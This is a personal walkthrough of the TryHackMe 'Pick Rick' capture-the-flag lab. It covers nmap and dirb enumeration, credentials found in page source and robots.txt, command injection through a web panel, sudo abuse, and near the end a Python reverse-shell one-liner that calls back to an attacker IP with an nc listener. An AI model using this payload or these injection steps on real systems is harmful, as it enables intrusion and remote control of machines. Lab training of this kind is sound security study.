https://tryhackme.com/room/picklerick
nmap 10.10.214.232 -A -SV

Output :
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-02 11:39 EST
Nmap scan report for 10.10.214.232
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bfc2a89ce4cd69cb5df52f7ee2a3d1a3 (RSA)
|   256 4bbc5f28ba43444e49fdacb21803ffea (ECDSA)
|_  256 cb4e639e67ce605530cebfbac8537ad2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.77 seconds
Interesting to note the open ssh port and port 80 is open making it so we can further enumerate the website that it is hosting. 
|   2048 bfc2a89ce4cd69cb5df52f7ee2a3d1a3 (RSA)
|   256 4bbc5f28ba43444e49fdacb21803ffea (ECDSA)
|_  256 cb4e639e67ce605530cebfbac8537ad2 (ED25519)


Unsure is this is important or not. 

|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)

Important because this may be a clue to the fuirst tag. Also the Apache version is good for further enumeration or exploitation. 
Moving on to what the website offers, we have…not much other than some text and a file photo. Nothing is provided in the page source information either. 
Just from memory or the school we would further look at what the site offers by running a directory finder or enemurator. In looking at tools that provide suchj a thing, we can usedirbuster and run it against a known dir list. 

Running dirb http://10.10.214.232 
Side note ,usure on why http has to be inputted. Ran it the first time like nmap a n error returned. 
START_TIME: Tue Jan  2 11:50:33 2024
URL_BASE: http://10.10.214.232/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
Common.txt is running by default, interesting to note that we can create or add out own list if needed.
While dir is running, looked at the page source again and found 
<!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

May be needed to for the ssh login possibly. 
Interesting to note that there is a place where the dev can place dir that they want hidden in the robots.txt. 
Page hangs for some reason, found the issue wrong ip.
http://10.10.214.232/robots.txt
Found: Wubbalubbadubdub may be a user or pass



In the mean time, found an /assets/ tag in firb. 
http://10.10.214.232/assets/
Index of /assets
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[TXT]	bootstrap.min.css	2019-02-10 16:37 	119K	 
[ ]	bootstrap.min.js	2019-02-10 16:37 	37K	 
[IMG]	fail.gif	2019-02-10 16:37 	49K	 
[ ]	jquery.min.js	2019-02-10 16:37 	85K	 
[IMG]	picklerick.gif	2019-02-10 16:37 	222K	 
[IMG]	portal.jpg	2019-02-10 16:37 	50K	 
[IMG]	rickandmorty.jpeg	2019-02-10 16:37 	488K	 
Apache/2.4.18 (Ubuntu) Server at 10.10.214.232 Port 80
Opened all of them and they did not help. Only opened the home page, a long list of text and some gifs. 
Dirb is still running. 
Checkpoint.
We have \\
Wubbalubbadubdub
    Username: R1ckRul3s
\\
Dirb has now found and index.html which brings me to the same home page. Kind of stuck here until dirb comes up with more directories to test. Going to run a scanner called nikto in the mean time to check where the dirb does not. 

[Screenshot 1]


Unable to to view other tabs without bbeing greeted to a Only the REAL rick can view this page.
Basis command to run is LS.
Found 
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

Sup3rS3cretPickl3Ingred.txt

Found the first tag with the http://10.10.214.232/Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair

Interesting to note down the list is the denied.php
Nothing there

Something to note is the clue.txt
http://10.10.214.232/clue.txt

Look around the file system for the other ingredient.

We may be looking at the system directory when trying running LS.

There may be hidden files that are only assessable if root or super admin. The machine may be verlnerable to injection because LS can be run or we can even setup a reverse shell to communicate more effectively with the machine. 

Going to go the easier route for now. 
Need to figure out what we can run and how much is locked down and is capable. 
Bad: cd, less
Good: ls and pwd
Pwd: /var/www/html

Ls -al reveals the access to the directory.
[Screeshot 2]


Interesting to note the 
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..

The dots may be a hint 
 Found ../ to navigate to the working root directory, after some fuzzing. Found the command 
cd ../../../../; ls -al; pwd


total 88
drwxr-xr-x  23 root root  4096 Jan  2 16:37 .
drwxr-xr-x  23 root root  4096 Jan  2 16:37 ..
drwxr-xr-x   2 root root  4096 Nov 14  2018 bin
drwxr-xr-x   3 root root  4096 Nov 14  2018 boot
drwxr-xr-x  14 root root  3260 Jan  2 16:36 dev
drwxr-xr-x  94 root root  4096 Jan  2 16:37 etc
drwxr-xr-x   4 root root  4096 Feb 10  2019 home
lrwxrwxrwx   1 root root    30 Nov 14  2018 initrd.img -> boot/initrd.img-4.4.0-1072-aws
drwxr-xr-x  21 root root  4096 Feb 10  2019 lib
drwxr-xr-x   2 root root  4096 Nov 14  2018 lib64
drwx------   2 root root 16384 Nov 14  2018 lost+found
drwxr-xr-x   2 root root  4096 Nov 14  2018 media
drwxr-xr-x   2 root root  4096 Nov 14  2018 mnt
drwxr-xr-x   2 root root  4096 Nov 14  2018 opt
dr-xr-xr-x 136 root root     0 Jan  2 16:36 proc
drwx------   4 root root  4096 Feb 10  2019 root
drwxr-xr-x  25 root root   880 Jan  2 16:37 run
drwxr-xr-x   2 root root  4096 Nov 14  2018 sbin
drwxr-xr-x   5 root root  4096 Feb 10  2019 snap
drwxr-xr-x   2 root root  4096 Nov 14  2018 srv
dr-xr-xr-x  13 root root     0 Jan  2 16:36 sys
drwxrwxrwt   8 root root  4096 Jan  2 17:17 tmp
drwxr-xr-x  10 root root  4096 Nov 14  2018 usr
drwxr-xr-x  14 root root  4096 Feb 10  2019 var
lrwxrwxrwx   1 root root    27 Nov 14  2018 vmlinuz -> boot/vmlinuz-4.4.0-1072-aws

Inmteresting to note 
drwxr-xr-x   4 root root  4096 Feb 10  2019 home
drwx------   2 root root 16384 Nov 14  2018 lost+found
drwx------   4 root root  4096 Feb 10  2019 root
drwxr-xr-x  14 root root  3260 Jan  2 16:36 dev
Navigated the home with 

cd /home/: ls -al: pwd
found 
total 16
drwxr-xr-x  4 root   root   4096 Feb 10  2019 .
drwxr-xr-x 23 root   root   4096 Jan  2 16:37 ..
drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
drwxr-xr-x  4 ubuntu ubuntu 4096 Feb 10  2019 ubuntu
/home

All were bad exceot for Rick.
Found 
cd /home/rick; ls -al; pwd

total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
/home/rick

Found the second part in the directory 

Interesting to note that because I could not simply use 
cd /home/rick/"second ingredients"; ls -al; pwd
only because this second ingredients seems like a word doc and it doesn’t help us if we can print the word doc. 
Has to use research and find a command that could view the contects of the second ingredients file. 
That command is less. The entirety of the command was less /home/rick/"second ingredients" because we are specifying the directory and “lessing” the second ingredients txt file.


Second part 
1 jerry tear

Now with the second part,m needed to check what provielages we currently have with sudo -l
We see Matching Defaults entries for www-data on ip-10-10-214-232.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-214-232.eu-west-1.compute.internal:
(ALL) NOPASSWD: ALL

It seems we can excute any command with privleage.

We can run sudo without anything stopping us or a password.

Running sudo ls /home 
Returns Rick and Ubuntu which again, doesn return anything.
Trying to navigate the machine more.

sudo ls /
returns 

bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz

possible good stuff
root: 3rd.txt
dev a list of nonsense
lost+found a list of nonsense

again with the less command, which looks like 
sudo less /root/3rd.txt because again, we are trying to view the contents of the txt through the command line. 
The last flag is fleep juice







Insteresting to note

Going to try the room again with the cyber mentors, way of finishing the room with netcat and python exploits.

Needed to find that python3 was used with which python3.returned /usr/bin/python3 meaning that we may be able to run python code to setup a reverse shell through the machine. The payload was found here 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python


python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.98.64",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
nc -nlvp on the port 4444

success the page hangs and the connection is good 

listening on [any] 4444 ...
connect to [10.2.98.64] from (UNKNOWN) [10.10.214.232] 48098
  in navigating the host and because there is no privilege, we can navigate unrestrained on the box.

Did some digging with ls and cd and found the root folder and found the third answer. Much easier when you are using a reverse shell. 
